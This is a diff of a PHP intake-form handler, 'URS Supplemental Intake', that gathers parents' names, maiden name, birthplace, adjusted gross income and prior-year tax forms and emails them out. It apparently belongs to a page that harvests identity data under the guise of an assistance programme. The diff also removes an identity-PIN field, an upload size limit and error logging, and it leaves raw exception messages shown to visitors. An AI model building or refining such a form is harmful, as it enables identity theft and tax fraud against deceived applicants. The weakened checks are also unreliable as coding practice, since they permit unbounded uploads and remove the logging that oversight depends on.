@@ -33,7 +33,6 @@ $maidenName   = $clean($_POST['urs_maiden_name'] ?? '');
 $otherContact = $clean($_POST['urs_other_contact'] ?? '');
 $birthPlace   = $clean($_POST['urs_birth_place'] ?? '');
 $agi          = $clean($_POST['urs_agi'] ?? '');
-$identityPin  = $clean($_POST['urs_identity_pin'] ?? '');
 
 $fields = [
     "FATHER NAME" => $fatherName,
@@ -42,10 +41,9 @@ $fields = [
     "OTHER CONTACT NAME" => $otherContact,
     "PLACE OF BIRTH" => $birthPlace,
     "ADJUSTED GROSS INCOME / BGI" => $agi,
-    "IDENTITY PIN" => $identityPin,
 ];
 
-$required = [$fatherName, $motherName, $birthPlace, $identityPin];
+$required = [$fatherName, $motherName, $birthPlace];
 if (in_array('', $required, true)) {
     echo "<h1>Submission Error</h1><p>Please complete all required fields.</p><a href='../erap-urs-details.html'>Go Back</a>";
     exit();
@@ -72,24 +70,15 @@ foreach ($fields as $label => $value) {
 $textBody = "URS Supplemental Intake\n\n" . implode("\n", $textLines);
 
 $attachments = [];
-$maxFileSize = 5 * 1024 * 1024; // 5 MB per file
 if (isset($_FILES['urs_prior_year_form'])) {
     $fileData = $_FILES['urs_prior_year_form'];
     if (is_array($fileData['tmp_name'])) {
         foreach ($fileData['tmp_name'] as $idx => $tmpName) {
             if ($tmpName && ($fileData['error'][$idx] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
-                if (($fileData['size'][$idx] ?? 0) > $maxFileSize) {
-                    echo "<h1>Submission Error</h1><p>Each upload must be 5MB or less. Please resize or compress your files.</p><a href='../erap-urs-details.html'>Go Back</a>";
-                    exit();
-                }
                 $attachments[] = ['path' => $tmpName, 'name' => $fileData['name'][$idx] ?? ('Prior-Year-Form-' . $idx)];
             }
         }
     } elseif (!empty($fileData['tmp_name']) && ($fileData['error'] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
-        if (($fileData['size'] ?? 0) > $maxFileSize) {
-            echo "<h1>Submission Error</h1><p>Each upload must be 5MB or less. Please resize or compress your files.</p><a href='../erap-urs-details.html'>Go Back</a>";
-            exit();
-        }
         $attachments[] = ['path' => $fileData['tmp_name'], 'name' => $fileData['name'] ?? 'Prior-Year-Form'];
     }
 }
@@ -113,7 +102,6 @@ try {
         $attachments
     );
 } catch (\Throwable $exception) {
-    error_log('[URS] Mail send failed: ' . $exception->getMessage());
     echo "<h1>Submission Error</h1>";
     echo "<p>We were unable to process your URS details at this time. Please contact support.</p>";
     echo "<pre>" . htmlspecialchars($exception->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
